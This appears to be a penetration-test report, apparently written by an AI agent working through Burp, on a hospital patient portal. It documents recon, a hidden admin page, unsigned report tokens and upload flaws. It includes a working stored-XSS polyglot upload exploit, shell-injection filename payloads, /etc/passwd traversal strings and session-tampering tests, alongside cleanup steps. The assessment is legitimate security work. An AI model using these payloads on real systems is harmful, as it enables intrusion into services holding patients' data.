         "/static/css/../../app.py" "/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd"; do
  curl -sS -o /dev/null --path-as-is -w "$u -> %{http_code} %{size_download}\n" "https://$TARGET$u"
done
```
Result: first four → **404**; encoded `../etc/passwd` → **400**. No traversal.

**22. CORS**

```bash
curl -sS -i -H 'Origin: https://evil.example' "https://$TARGET/api/doctors"
curl -sS -i -X OPTIONS -H 'Origin: https://evil.example' \
  -H 'Access-Control-Request-Method: POST' "https://$TARGET/api/doctors"
```
Result: no `Access-Control-Allow-*` headers in either response — API not cross-origin readable.

**23. Brand/OSINT check**

```bash
dig +short A nilecare.com.eg
dig +short MX nilecare.com.eg
dig +short NS nilecare.com.eg
dig +short TXT nilecare.com.eg
whois nilecare.com.eg | head -25
```
Result: **no A/MX/NS/TXT records**; whois: "This TLD has no whois server." → synthetic brand domain.

**24. Content extraction**

```bash
python3 - <<'PY'
import re
h=open('pages/branches.html',encoding='utf-8').read()
h=re.sub(r'<script.*?</script>','',h,flags=re.S)
t=re.sub(r'<[^>]+>',' ',h); t=re.sub(r'\s+',' ',t)
print(t[t.find('Our Branches'):][:1200])
PY
python3 - <<'PY'
import re
h=open('pages/lab-tests.html',encoding='utf-8').read()
for m in re.finditer(r"selectTest\((\d+),\s*'([^']+)',\s*(\d+)\)",h):
    print(m.group(1),'|',m.group(2),'|',m.group(3),'EGP')
PY
```
Result: 3 branches (Giza, New Cairo, Alexandria) with addresses/phones; 8 lab tests and prices (see Appendix B).

**25. Cloudflare trace**

```bash
curl -sS "https://$TARGET/cdn-cgi/trace"
```
Result: `colo=MRS`, `loc=EG`, `tls=TLSv1.3`, `http=http/2`, `warp=off`, `gateway=off` — confirms edge and client geolocation; no origin information.

### C.4 Evidence files

```
/tmp/opencode/recon/
├── root.html            # home page
├── headers.txt          # baseline response headers
├── robots.txt           # Cloudflare-managed robots
├── api_doctors.json     # 22-record JSON dump
├── main.js, style.css   # static assets
├── pages/               # all fetched routes
├── robots2.txt, xss.html, p_*.html, resp_*.txt, j*.txt
```

### C.5 Limitations of this recon

- Custom 46-path wordlist only — not a full content-discovery run.
- No authenticated session, so dashboard/profile/report/lab-booking/review flows were only observed at the redirect boundary.
- No exploitation attempts: discount tampering, report-token forgery, stored XSS, and CSRF were identified from source/behaviour but **not** exercised.
- Rate-limiting conclusion is based on ~40 low-rate requests, not a load test.

---

## Appendix D — Burp MCP / proxied-traffic findings

This appendix covers the second pass, after the browser was pointed at Burp's proxy and Burp's MCP server was enabled. It adds the hidden admin portal, the attachment-upload endpoint, the real request formats, and a scanner cross-check.

### D.1 Tooling

opencode's configured `burp` MCP entry (`mcp-proxy.jar --sse-url http://127.0.0.1:9876/`) reported `failed: Not connected`, while Burp itself was listening on `127.0.0.1:9876`. I therefore spoke MCP-over-SSE to Burp directly with a small Python client:

- `/tmp/opencode/recon/mcp_client.py` — SSE handshake (`GET /` → `event: endpoint`, `data: ?sessionId=<uuid>`), JSON-RPC POST to `/?sessionId=<uuid>`, reads `event: message` responses.
- `/tmp/opencode/recon/mcp_tools.py` — `initialize` + `tools/list`; saved all tool schemas to `burp_tools.json`.
- `/tmp/opencode/recon/mcp_call.py` — generic `tools/call` wrapper.
- `/tmp/opencode/recon/mcp_history.py` — bulk history/scanner/organizer pull.

Handshake proven:

```bash
# Quick Tunnel rotated; the current host is patricia-chapter-suites-patches.trycloudflare.com
TARGET=patricia-chapter-suites-patches.trycloudflare.com
python3 /tmp/opencode/recon/mcp_client.py
# SSE status: 200 text/event-stream
# first event: ('endpoint', '?sessionId=...')
# INIT: {"result":{"serverInfo":{"name":"burp-suite","version":"1.1.2"}}}
```

MCP calls used (read-only tools only):

```
get_proxy_http_history          {"count":20,"offset":0}
get_proxy_http_history_regex    {"count":200,"offset":0,"regex":"salvation-materials-wall-category"}
get_scanner_issues              {"count":200,"offset":0}
get_organizer_items             {"count":20,"offset":0}
```

Third pass: Burp's MCP tools became directly available in the Code Mode catalog, so the newest history was pulled with `tools.burp.get_proxy_http_history` (`count: 80`) and parsed by splitting on `{"request":` blocks. The scanner was read with `tools.burp.get_scanner_issues`.

Caveat: Burp returns each history item's text truncated at ~5 KB and concatenates items with a blank line, so the MCP `content[0].text` is **not** valid JSON as a whole. `json.loads` fails with `Extra data`; the parser had to split on `\n\n{"request":` / `\n\n{"name":` and unescape each field individually.

### D.2 Proxy history summary

Burp held 68 items in the window (15:41–16:01 UTC); 60 were requests to the target host (the rest were CDN/font/Unsplash fetches carrying a target `Referer`). Distinct target requests observed:

| Method | Path | Status | Notable parameters / result |
|---|---|---|---|
| GET | `/` | 200 | anonymous home page |
| GET | `/services` | 200 | "Our Services" page |
| GET | `/doctors`, `/branches`, `/lab-tests`, `/book` | 200 | normal browsing |
| POST | `/register` | 302 → `/login` | `full_name`, `email`, `phone`, `password`, `confirm_password`; 6-char password accepted; no CSRF |
| POST | `/login` | 302 → `/dashboard` | `email`, `password`; immediate session |
| GET | `/profile` | 200 | authenticated profile |
| POST | `/profile` | (multipart) | `profile_image` file upload; no CSRF; stored as `/static/uploads/user_896_1792942998.jpeg` |
| GET | `/static/uploads/user_896_1792942998.jpeg` | 200 | `image/jpeg`, publicly readable |
| POST | `/lab-tests/book` | 302 → `/lab-tests` | `test_id=8&discount_pct=0&discount_code=nilecare50` → flash `Invalid discount code. Please check and try again.` |
| POST | `/lab-tests/book` | 302 → `/dashboard` | `test_id=3&discount_pct=0&discount_code=` → success flash with test name/price |
| GET | `/robots.txt` | 200 | Cloudflare block **plus** a custom 100-entry `Disallow` section |
| GET | `/admin_private_95466` | 404 | one of the robots paths, probed by the browser |
| GET | `/api` | 404 | no API index |
| GET | `/api/doctors` | 200 | 22-record JSON again |
| GET | `/favicon.ico` | 404 | no favicon |

The register/login/upload/booking rows above were performed interactively in the proxied browser; this recon did not create them.

**Third-pass history (20:00–21:50 UTC, current host).** 80 items pulled, 71 on `patricia-chapter-suites-patches.trycloudflare.com`. New/relevant requests:

| Method | Path | Status | Notable result |
|---|---|---|---|
| POST | `/profile` | (multipart, 302) | field `profile_image`, `king.jpeg`; stored `user_896_1792958928.jpeg` |
| GET | `/static/uploads/user_896_1792958928.jpeg` | 200 / 304 | `image/jpeg`, public, `inline` |
| GET | `/static/uploads/user_896_1792958928.jpeg?cmd=ls` | 200 | returns the unchanged JPEG (no code execution) |
| POST | `/reports/upload-attachment` | 302 | field `attachment`, `king.jpeg` → success flash, link `/static/uploads/attachments/king.jpeg` |
| GET | `/static/uploads/attachments/king.jpeg` | 200 | `image/jpeg`, 7160 bytes, `inline`, public |
| POST | `/reports/upload-attachment` | 302 | `shell.php` (`application/x-php`) → `Security Error: Only PNG, JPEG, and PDF MIME types are permitted!` |
| POST | `/reports/upload-attachment` | 302 | `shell.php%00.png`, `shell.php.jpg` (`application/x-php`) → same MIME error |
| GET | `/static/uploads/attachments/shell.php.jpeg` | 404 | no stored artifact from the rejected uploads |
| GET | `/static/uploads/attachments/shell.php%00.png?cmd=ls` | 400 | Cloudflare rejects the null-byte URL |

The `?cmd=ls` probes were read-only checks that the stored files are static and not executed; both returned the normal image / a 400, not command output.

### D.3 New finding: hidden admin portal

`robots.txt` ends with an app-supplied block:

```
User-agent: *
Disallow: /v2_dump_98196
Disallow: /auth_test_30256
... 100 entries total ...
Disallow: /admin_portal_temp_secure_9203
...
```

An OPTIONS sweep of all 100 paths found exactly one live route:

```bash
TARGET=salvation-materials-wall-category.trycloudflare.com
grep '^Disallow:' robots.txt | sed 's/^Disallow: //' > robots_paths.txt   # 100 paths
cat robots_paths.txt | xargs -P 12 -I{} sh -c \
  'code=$(curl -sS -o /dev/null -X OPTIONS --max-time 15 -w "%{http_code}" "https://'"$TARGET"'{}"); \
   [ "$code" != "404" ] && echo "{} -> $code"'
# /admin_portal_temp_secure_9203 -> 200 ; all other 99 -> 404
```

Behavior:

```bash
curl -sS -i "https://$TARGET/admin_portal_temp_secure_9203"
# 200, text/html, title "System Administration - Egyptian Specialist Hospital"
# form action="/admin_portal_temp_secure_9203" method="POST"
#   input name="email"    (type=email)
#   input name="password" (type=password, label "Security Key / Password")
# no CSRF token; no Set-Cookie on GET

curl -sS -i -X POST -d 'email=&password=' "https://$TARGET/admin_portal_temp_secure_9203"
# 200, re-renders form with: "Administrative email account not found in system."

curl -sS -i -X OPTIONS "https://$TARGET/admin_portal_temp_secure_9203/logout"
# 200, Allow: GET, OPTIONS, HEAD
curl -sS -i "https://$TARGET/admin_portal_temp_secure_9203/logout"
# 302 -> /admin_portal_temp_secure_9203
# flash: "Logged out from admin session."
```

Implications: the admin surface is discoverable from `robots.txt`, is anonymously reachable, has no CSRF protection, and uses GET logout. The error text (`Administrative email account not found in system.`) is **not** a usable account-existence oracle in practice: a random non-existent address and the valid patient address both return the same message because the handler queries a separate admin table (see §D.11). No password/credential guessing was performed; the only POSTs were empty credentials, the existing patient test account, and a random non-existent address.

### D.4 Confirmed: medical-report attachment upload

Burp's scanner flagged a second file-upload form on `/dashboard`; its action is `POST /reports/upload-attachment`. This is the **medical-report attachment** upload (distinct from the profile-photo upload at `POST /profile`).

Request/response behavior observed in Burp (patient session; host `patricia-chapter-suites-patches.trycloudflare.com`):

| Request | Result |
|---|---|
| `GET /reports/upload-attachment` (anonymous) | `405`, `Allow: POST, OPTIONS` |
| `POST /reports/upload-attachment` (anonymous, no body) | `302 → /login`, flash `Please login to upload attachments.` |
| `POST /reports/upload-attachment`, field `attachment`, `king.jpeg`, `Content-Type: image/jpeg` | `302 → /dashboard`, flash `Medical attachment uploaded successfully!` with link `/static/uploads/attachments/king.jpeg` |
| `POST` field `attachment`, `shell.php`, `Content-Type: application/x-php` | `302 → /dashboard`, flash `Security Error: Only PNG, JPEG, and PDF MIME types are permitted!` |
| `POST` field `attachment`, `shell.php%00.png`, `Content-Type: application/x-php` | same MIME error |
| `POST` field `attachment`, `shell.php.jpg`, `Content-Type: application/x-php` | same MIME error |
| `GET /static/uploads/attachments/king.jpeg` | `200`, `Content-Type: image/jpeg`, `Content-Length: 7160`, `Content-Disposition: inline; filename=king.jpeg` |

Key observations:

- The endpoint **keeps the client-supplied filename** (`king.jpeg`) and stores it under `/static/uploads/attachments/`. No randomisation, no per-user directory.
- The upload is validated in three steps: declared `Content-Type` (PHP type refused), **magic bytes** (HTML body refused), and an **extension substring** check. The third check is flawed: `poc.jpg.html` contains `.jpg` and passes, but the final `.html` suffix determines the served `Content-Type`. Combined with a JPEG-polyglot body, this yields stored XSS — confirmed in §D.8.
- The stored attachment is **publicly retrievable without a session** — an unauthenticated `HEAD`/`GET` returned `200 image/jpeg` (verified with `curl -I`). There is no download-authorization check. Anyone who knows or guesses a filename can fetch it.
- Filenames are predictable (original filename, no user scoping), so collisions/overwrites between users are possible and discovery is trivial (`king.jpeg`, `report.pdf`, …).
- The upload form has **no CSRF token**, and the success flash renders the filename inside an HTML link (`<a href="…">`); the filename is reflected into the page. HTML escaping was observed on the flash, but the sink is worth noting.

Anonymous probes confirming the public retrieval:

```bash
TARGET=patricia-chapter-suites-patches.trycloudflare.com
curl -sS -I "https://$TARGET/static/uploads/attachments/king.jpeg"
# HTTP/2 200 ; content-type: image/jpeg ; content-length: 7160
# content-disposition: inline; filename=king.jpeg

curl -sS -I "https://$TARGET/static/uploads/attachments/doesnotexist-abc123.jpeg"
# HTTP/2 404
```

Profile-photo equivalent (same public-storage pattern, different naming):

```bash
curl -sS -I "https://$TARGET/static/uploads/user_896_1792958928.jpeg"
# HTTP/2 200 ; content-type: image/jpeg ; content-disposition: inline; filename=user_896_1792958928.jpeg
```

Conclusion: **both** upload features exist — the profile photo at `POST /profile` (`profile_image`) and medical reports at `POST /reports/upload-attachment` (`attachment`). The medical-report path is the more interesting one because it preserves the original filename and serves the file publicly; its three checks (declared `Content-Type`, magic bytes, extension substring) are bypassable with a double extension plus a JPEG polyglot, giving stored XSS (§D.8).

### D.5 Burp scanner results for the target

79 issues in the scanner, 39 on the target host. Breakdown:

| Count | Severity | Issue |
|---|---|---|
| 5 | MEDIUM | TLS cookie without `Secure` flag (`session` on `/login`, `/register`, `/profile`, `/dashboard`, `/lab-tests/book`) |
| 7 | LOW | Strict transport security not enforced (`/`, `/login`, `/register`, `/favicon.ico`, static CSS/JS, Cloudflare email-decode JS) |
| 9 | INFO | Frameable response / potential clickjacking (`/`, `/services`, `/doctors`, `/branches`, `/lab-tests`, `/login`, `/register`, `/dashboard`, `/profile`) |
| 9 | INFO | Cacheable HTTPS response |
| 6 | INFO | E-mail addresses disclosed (doctor addresses, plus template examples `john@example.com`, `ahmed@example.com`, `patient@example.com`, `your.email@example.com`) |
| 2 | INFO | File upload functionality (`/profile`, `/dashboard` → `/reports/upload-attachment`) |
| 1 | INFO | Private IP address disclosed (`192.168.1.42`, from the stored XSS review payload on `/doctors`) |

No SQLi/XSS/SSRF/traversal issues were reported by the scanner for this host. The scanner's clickjacking/HSTS/cookie results independently corroborate section 6 and section 5.

### D.6 Delta versus the first pass

New or refined:
- `/admin_portal_temp_secure_9203` and its `/logout` (new, high-value hidden surface).
- `/reports/upload-attachment` confirmed as the **medical-report attachment** upload (`attachment`), separate from the profile photo; accepted `king.jpeg`, rejected PHP-labelled files, stored publicly at `/static/uploads/attachments/<original_name>`.
- Real registration/login/booking parameter names and the fact that `discount_pct` travels alongside `discount_code`; invalid codes are rejected server-side.
- Profile upload flow confirmed: `profile_image` → `/static/uploads/user_896_1792958928.jpeg`, publicly readable, sequential user IDs.
- `robots.txt` custom 100-path block (99 decoys, 1 live).
- Scanner evidence for cookie-without-Secure at MEDIUM and clickjacking at INFO.

Unchanged/confirmed: 22 doctors + e-mails, 8 lab tests, 3 branches, unsigned Base64 report token, escaped stored-XSS payloads, no CSRF, no HSTS/CSP/XFO, HTTP/2 edge, TLS 1.0/1.1 acceptance (from the first pass).

### D.7 Additional limitations

- Burp truncates each history item at ~5 KB and concatenates items, so the dashboard body could not be fully enumerated; findings are based on the flash fragments and the requests themselves.
- `/reports/upload-attachment` was exercised with `king.jpeg` (accepted), PHP-labelled files (rejected), HTML-only files (rejected by magic bytes), and JPEG-polyglot files (accepted; see §D.8). The magic-byte check is real, but it only validates the header; trailing HTML survives.
- `shell.php%00.png` was rejected by the MIME check before storage; the resulting URL probes returned 404/400, so no stored artifact was found.
- Admin credentials were not guessed; the enumeration oracle is inferred from the empty-input response only.
- Uploaded-file enumeration across other users was not performed. Only URLs already present in Burp history and the recorded `king.jpeg` attachment were fetched.
- Burp history also contained unrelated Firefox/Mozilla telemetry traffic; only items whose `Host` was a target host were used.

### D.8 Confirmed: stored XSS via medical-report upload (double extension + JPEG polyglot)

Current host: `magnetic-paragraph-romance-hobbies.trycloudflare.com` (2026-10-26). Authenticated with the existing test account (`te@st`), then uploaded a benign JPEG+HTML polyglot to `POST /reports/upload-attachment`.

**Validation chain** (each message came from the `/dashboard` flash after a `302`):

| Check | Test | Result |
|---|---|---|
| Declared `Content-Type` | `shell.php` + `application/x-php` | `Security Error: Only PNG, JPEG, and PDF MIME types are permitted!` |
| Magic bytes | `poc.html` + `image/jpeg`, HTML body | `Security Error: Invalid file magic bytes signature header!` |
| Extension present | `poc.html` + `image/jpeg`, JPEG polyglot body | `Security Error: Allowed extensions (.png, .jpg, .jpeg, .pdf) not found in filename!` |
| Path traversal | filename `../poc-traversal.jpg.html` | sanitized to `poc-traversal.jpg.html`; stored in `attachments/` (no escape) |

**Bypass:** filename `poc.jpg.html` with a body that starts with a valid JPEG header and then contains HTML/JS.

- `.jpg` appears in the filename → extension check passes
- `FF D8 FF E0 ... JFIF` at offset 0 → magic-byte check passes
- declared `Content-Type: image/jpeg` → MIME check passes
- final extension is `.html` → Flask/Werkzeug serves the stored file as `text/html`

Request:

```bash
H=https://magnetic-paragraph-romance-hobbies.trycloudflare.com
# cookies.txt holds the patient session from POST /login (te@st)
curl -sS -b cookies.txt -c cookies.txt -X POST "$H/reports/upload-attachment" \
  -F 'attachment=@polyglot.html;filename=poc.jpg.html;type=image/jpeg'
# 302 -> /dashboard
# flash: Medical attachment uploaded successfully!
#        <a href="/static/uploads/attachments/poc.jpg.html">View Uploaded File</a>
```

Response for the stored file:

```bash
curl -sS -I "$H/static/uploads/attachments/poc.jpg.html"
# HTTP/2 200
# content-type: text/html; charset=utf-8
# content-disposition: inline; filename=poc.jpg.html
# cache-control: no-cache
# (no X-Content-Type-Options)
```

PoC body (589 bytes) = 1×1 JPEG + newline +:

```html
<h1>NILECARE-POLYGLOT-POC</h1>
<script>alert(document.domain)</script>
```

**Execution verified in a real browser engine** (headless Chromium):

```bash
chromium --headless --no-sandbox --disable-gpu --virtual-time-budget=4000 --dump-dom \
  "$H/static/uploads/attachments/poc2.jpg.html" \
  | grep -oE 'data-xss="confirmed"|NILECARE-XSS-CONFIRMED'
# data-xss="confirmed"
# NILECARE-XSS-CONFIRMED
```

Live PoC links (now neutralized):

- `https://magnetic-paragraph-romance-hobbies.trycloudflare.com/static/uploads/attachments/poc.jpg.html`
- `https://magnetic-paragraph-romance-hobbies.trycloudflare.com/static/uploads/attachments/poc2.jpg.html`
- `https://magnetic-paragraph-romance-hobbies.trycloudflare.com/static/uploads/attachments/poc-traversal.jpg.html`

These three files were **overwritten with a clean 1×1 JPEG** during cleanup. They still return `200 text/html` (because of the `.html` suffix) but now contain only JPEG bytes — no `<script>`, no marker, no XSS. True deletion is not exposed by the app (no delete route; `DELETE` returns `405`), so the owner must remove them from the server filesystem:

```bash
# run in the app root on the server
rm -f static/uploads/attachments/poc.jpg.html \
      static/uploads/attachments/poc2.jpg.html \
      static/uploads/attachments/poc-traversal.jpg.html
```

**Impact:** stored XSS on the application origin, delivered from a public unauthenticated URL. It can perform same-origin `fetch` calls as a logged-in patient, read/inject DOM content, and bypass the missing CSRF protections. The session cookie is `HttpOnly`, so direct `document.cookie` theft is not possible, but same-origin actions and data reads are. The upload form itself has no CSRF token, so an attacker can also cause a victim to upload a file.

**Why it works:** the extension check is a substring test ("`.jpg` found in filename") while the web server chooses `Content-Type` from the final suffix. The magic-byte check only looks at the header and does not reject trailing data.

All PoC payloads were benign (alert/DOM marker); no data was exfiltrated and no other user's files were accessed. The three accepted files were overwritten with a clean JPEG during cleanup; run the `rm` command above to remove them entirely.

### D.9 Profile-photo upload — Python polyglot test (negative)

Tested on `magnetic-paragraph-romance-hobbies.trycloudflare.com` with the test account (`te@st`).

| Attempt | Filename / body | Result |
|---|---|---|
| 1 | `poc.jpg.py` + JPEG magic + `print("NILECARE-PROFILE-PY-POC")`, `image/jpeg` | `302 → /profile`, flash `Invalid image format. Allowed formats: png, jpg, jpeg, gif.` → rejected |
| 2 | `poc.jpg` + same body | `302 → /profile`, flash `Profile updated successfully!` → accepted |

The accepted avatar was stored at `/static/uploads/user_896_1793067860.jpg`:

```http
HTTP/2 200
content-type: image/jpeg
content-length: 551
content-disposition: inline; filename=user_896_1793067860.jpg
```

Body started with `ff d8 ff e0` and still contained `NILECARE-PROFILE-PY-POC`, but was **served as an image and not executed**. The handler does not re-encode, so trailing data survives; the final extension (`.jpg`) controls the MIME type.

The original avatar was restored after the test:

```
/static/uploads/user_896_1793067890.jpg   (462563 bytes, image/jpeg)
```

Cleanup: the polyglot avatar `/static/uploads/user_896_1793067860.jpg` still exists (the profile now points at the restored file). There is no delete route, so remove it server-side if desired:

```bash
rm -f static/uploads/user_896_1793067860.jpg
```

Conclusion: the profile-photo path also cannot execute Python. It uses a **final-extension** check (unlike the attachment endpoint’s substring check), stores the file as an image, and serves it as `image/jpeg`. No RCE.

### D.10 Report-token IDOR test (negative) and why `user_id: 999` is not admin

The report links on the dashboard use an **unsigned** Base64 JSON token:

```
/api/v1/reports/view?token=eyJ1c2VyX2lkIjogODk2LCAicmVwb3J0X2lkIjogMjA1Mn0=
# decodes to {"user_id": 896, "report_id": 2052}
```

Because the token is not signed, it was varied while keeping the legitimate patient session (`te@st`, `user_id 896`):

| Token payload | Request | Result |
|---|---|---|
| `{"user_id":896,"report_id":2052}` (own) | GET with session | `200`, report renders |
| `{"user_id":896,"report_id":3994}` (own) | GET with session | `200`, report renders |
| `{"user_id":896,"report_id":999}` | GET with session | `404`, body `Access Denied or Report Not Found` |
| `{"user_id":896,"report_id":1}` | GET with session | `404`, body `Access Denied or Report Not Found` |
| `{"user_id":896,"report_id":2}` | GET with session | `404`, body `Access Denied or Report Not Found` |
| `{"user_id":999,"report_id":999}` | GET with session 896 | `404`, body `Access Denied or Report Not Found` |
| `{"user_id":896,"report_id":2052,"is_admin":true,"role":"admin"}` | GET with session | `200`, same patient report — extra fields ignored |
| `{"report_id":2052}` (no `user_id`) | GET with session | `400` |
| `{"user_id":"896","report_id":2052}` (string) | GET with session | `200` — type is coerced |
| `{"user_id":896,"report_id":2052}` | GET **without** session | `302 → /login` |

The `404` body is deliberately ambiguous (`Access Denied or Report Not Found`), so it merges "not yours" and "does not exist" — there is no user/report enumeration signal. The endpoint is ownership-scoped to the **session** user, not to the token's `user_id`.

**Why editing `user_id` to `999` cannot grant admin:**

1. The report token has no role/privilege field. It only selects a report to display; the response is a plain report page (title, patient name/email/phone, lab, status) with no admin navigation or admin actions.
2. The Flask session cookie **is** signed (itsdangerous: `payload.timestamp.signature`). The server ignores the token's `user_id` unless it matches `session["user_id"]`. Proof: the session payload decodes to

   ```json
   {"_flashes":[...],"patient_email":"te@st","patient_name":"test","user_id":896}
   ```

   Re-encoding that payload with `user_id: 999` and `is_admin: true` while keeping the old signature was rejected: `GET /dashboard` → `302 → /login`. Only the unmodified cookie returned `200`.
3. The admin portal is a **separate login** with its own account store. There is no code path from a report token to an admin session, and no `is_admin`/`role` key exists in the patient session at all.

So `user_id: 999` in the report token is not a privilege boundary and not an admin bypass — it only causes the ownership comparison to fail.

### D.11 Admin portal — login attempts with known/benign accounts (negative)

Tested `POST /admin_portal_temp_secure_9203` with the existing patient test account and with a random non-existent address. No password guessing, no account lockout attempts.

| Credentials | Response |
|---|---|
| `email=te@st`, `password=123456` (valid **patient** account) | `200`, `Administrative email account not found in system.` |
| `email=nobody-xyz-4821@example.invalid`, `password=whatever123` | `200`, `Administrative email account not found in system.` |
| empty `email` / `password` (earlier pass) | `200`, `Administrative email account not found in system.` |
| `email=te@st`, `password=123456` **with patient session cookie** | `200`, `Administrative email account not found in system.` |

Additional checks:

```
GET  /admin_portal_temp_secure_9203                 -> 200 (anonymous and with patient session)
GET  /admin_portal_temp_secure_9203/                -> 404
GET  /admin_portal_temp_secure_9203/dashboard       -> 404
GET  /admin_portal_temp_secure_9203/logout          -> 302 -> /admin_portal_temp_secure_9203
GET  /admin, /admin/dashboard                       -> 404
```

The patient session adds only the normal patient nav ("Dashboard"/"Logout", "Welcome back, test!") to the admin page — no admin content. A failed admin login sets no cookie. Both the valid patient address and a random address return the **same** message, so the page is querying a separate admin table; this is **not** a confirmed account-existence oracle for admin addresses, and the publicly listed contact address was still not tested.

Conclusion: the hidden admin portal is discoverable and has no CSRF protection, but no authentication bypass was found. Access requires a real administrative account; the patient account and the unsigned report token do not grant it. No admin credentials were guessed or brute-forced.

### D.12 OS command injection — tested (negative)

Goal: check whether any user-controlled value reaches a shell (`os.system`, `subprocess` with `shell=True`, etc.). Detection used time-based payloads (`sleep`) and output-embedding payloads (`$(id)`), with controls to account for Quick Tunnel latency (baseline ~0.5–3.5 s, highly variable).

**1. Upload filenames (the most likely sink — image/PDF processing often shells out).**

Reports endpoint (`POST /reports/upload-attachment`):

```
filename=poc$(sleep 5).jpg      -> 302, 1.3 s (repeat trials 1.0–4.9 s, no consistent +5 s)
filename=poc`sleep 5`.jpg       -> 302, 1.0–4.0 s, no consistent +5 s
filename=poc;sleep 5;.jpg       -> 302, 1.5 s
filename=poc|sleep 5.jpg        -> 302, 1.5 s
filename=poc&&sleep 5&&.jpg     -> 302, 1.3 s
```

Stronger test — `sleep 20`, control vs payload:

```
control (ci-control.jpg)        -> 1.1 s
poc$(sleep 20).jpg              -> 1.0 s
```

Output-embedding test:

```
filename=poc$(id).jpg
# flash: Medical attachment uploaded successfully!
# link:  /static/uploads/attachments/poc$(id).jpg     <- literal, no uid= expansion
filename=poc`id`.jpg
# link:  /static/uploads/attachments/poc`id`.jpg      <- literal
```

The filename is stored byte-for-byte (including `$`, `(`, `)`, backticks, `;`, `|`, `&`); shell metacharacters are not interpreted and no output is substituted. This is consistent with a plain Python `open(path, "wb")`, not a shell call. (Path separators are still neutralized — `../` earlier landed inside `attachments/`.)

Profile endpoint (`POST /profile`): the handler generates `user_896_<timestamp>.<ext>` itself. `poc$(sleep 20).jpg` → 1.03 s vs 1.1 s control; no delay.

**2. Search / query parameters.**

```
GET /doctors?search=test              -> ~2.8 s (control)
GET /doctors?search=test;sleep 15     -> 2.7–4.0 s
GET /doctors?search=test$(sleep 15)   -> 2.7–3.6 s
GET /doctors?search=test`sleep 15`    -> 3.9–4.5 s
GET /doctors?search=test;sleep 6      -> one 8.8 s outlier, not reproducible
```

No payload ever produced the expected +15 s. The 8.8 s sample was tunnel/network noise; subsequent trials of the same payload were 2.7–4.0 s.

**3. POST text fields.**

```
POST /contact          subject=$(sleep 20)        -> 0.47 s (control 1.2 s)
POST /lab-tests/book   discount_code=$(sleep 20)  -> 0.61 s (control 0.60 s)
POST /book             notes=$(sleep 20)          -> 0.55 s (control 0.52 s)
```

All returned the same `302`/`200` as controls, with no delay and no command output.

**4. Report token.**

```
token={"user_id":"896$(sleep 15)","report_id":2052}  -> 404, 0.44 s
token={"user_id":896,"report_id":"2052$(sleep 15)"}  -> 404, 2.72 s (noise)
token=$(sleep 15)  (raw)                             -> 400, 0.82 s
```

The token is parsed as JSON/Base64, never passed to a shell; malformed values fail fast.

**Conclusion:** no OS command injection was found in the tested vectors: upload filenames (both endpoints), doctor search, contact form, appointment booking, lab booking/discount code, and the report token. No response reflected command output (`id`) and no `sleep` payload added its expected delay. Combined with §D.9 and §D.10 (no Python execution, no SSTI, signed session), there is no evidence of server-side command execution on this app.

Artifacts created while testing (all harmless 1×1 JPEGs, accepted by the upload filter) remain under `static/uploads/attachments/` because there is no delete route:

```
base.jpg
poccontrol.jpg
poc$(id).jpg
poc$(sleep 5).jpg
poc`sleep 5`.jpg
poc;sleep 5;.jpg
poc|sleep 5.jpg
poc&&sleep 5&&.jpg
```

Remove them on the server if desired (quote the names so the shell does not expand them):

```bash
cd static/uploads/attachments
rm -f 'base.jpg' 'poccontrol.jpg' 'poc$(id).jpg' 'poc$(sleep 5).jpg' \
      'poc`sleep 5`.jpg' 'poc;sleep 5;.jpg' 'poc|sleep 5.jpg' 'poc&&sleep 5&&.jpg'
```

The profile test also created two server-named avatar files (in addition to the earlier `user_896_1793067860.jpg`). The profile currently points at the restored original `user_896_1793068959.jpg` (462563 bytes). List and remove the others:

```bash
ls -lt static/uploads/user_896_*.jpg
# keep only user_896_1793068959.jpg (the active avatar); remove the rest
```

---

### D.12 — Flask Security Skill: Independent Review and Follow-up Testing

> **Numbering note:** the earlier `D.12 OS command injection — tested (negative)` is preserved above. This section uses the requested label; it is a new, independent review, not a replacement for the earlier D.12.

**Assessment context**

- **Target:** `https://magnetic-paragraph-romance-hobbies.trycloudflare.com/` (live during this pass; Quick Tunnel hostname still rotates).
- **Follow-up date:** 2026-10-27 UTC (original recon: 2026-10-25/26).
- **Account:** the explicitly authorized test account `te@st` / `123456` (`user_id` 896). No other account was created or used.
- **Source code:** none available locally; this was a black-box review. Burp MCP was unusable (`SseClientTransport is not initialized!`), so testing used `curl` and Python Playwright/Chromium.
- **Constraints applied:** no brute force, no credential attacks, no persistence, no denial of service, no destructive exploitation, no real patient data. Report IDs that might belong to other users were not requested. All temporary email/password changes were reverted and the original login was re-verified.
- **Verdict:** the earlier high-level conclusions largely hold. The public stored-XSS upload and the client-trusted lab discount are now confirmed with fresh evidence. New high-impact issues were found in credential management, CSRF-token design, session lifecycle, and HTTP cookie transport. No RCE, cross-user IDOR, or admin privilege escalation was confirmed.

**Classification key:** `CONFIRMED` = independently reproduced; `NOT REPRODUCED` = attempted and failed; `INCONCLUSIVE` = evidence insufficient or ambiguous; `NOT TESTED` = not exercised because of scope, authorization, or data-protection limits.

---

#### 1. Previous findings reviewed

| Prior conclusion (location) | Classification | Independent basis |
|---|---|---|
| Target is a live Flask hospital portal behind an ephemeral Cloudflare Quick Tunnel; hostname rotates (`D.1`–`D.3`). | **CONFIRMED** | `GET /` returned `200`; login and authenticated pages worked. |
| Hidden admin portal exists at `/admin_portal_temp_secure_9203`, has a separate account store, and no CSRF token (`D.3`, `D.11`). | **CONFIRMED** | `GET` returned the admin login form with no `csrf_token`; one benign patient-credential POST returned `Administrative email account not found in system.` No admin session or content was obtained. |
| Medical attachment upload accepts polyglot filenames such as `poc.jpg.py` (user brief; related to `D.8`). | **CONFIRMED for the attachment endpoint** | A clean JPEG named `fsa-f8d89e8c.jpg.py` was accepted (`302 /dashboard`) and stored. It was served as static `text/x-python`, not executed. |
| Uploaded Python payloads are served as static files, not executed (`D.8`, `D.9`, `D.12`). | **CONFIRMED** | The stored `.jpg.py` returned `200 text/x-python`, 7,160 bytes, JPEG magic `ffd8ffe0`; no Python or shell execution occurred. |
| Profile-picture upload rejects `.py` extensions and accepts valid image extensions (`D.9`). | **CONFIRMED** | `fsa-f8d89e8c.jpg.py` was rejected with `Invalid image format. Allowed formats: png, jpg, jpeg, gif.` The active avatar remained `user_896_1793068959.jpg`. |
| Stored XSS was demonstrated through an uploaded `poc.jpg.html` file (`D.8`). | **CONFIRMED, re-established** | The old PoCs had been overwritten with clean JPEGs. A fresh 240-byte JPEG+HTML polyglot named `fsa-f8d89e8c.jpg.html` was served as `text/html` and executed in Chromium (`title` and DOM marker changed). |
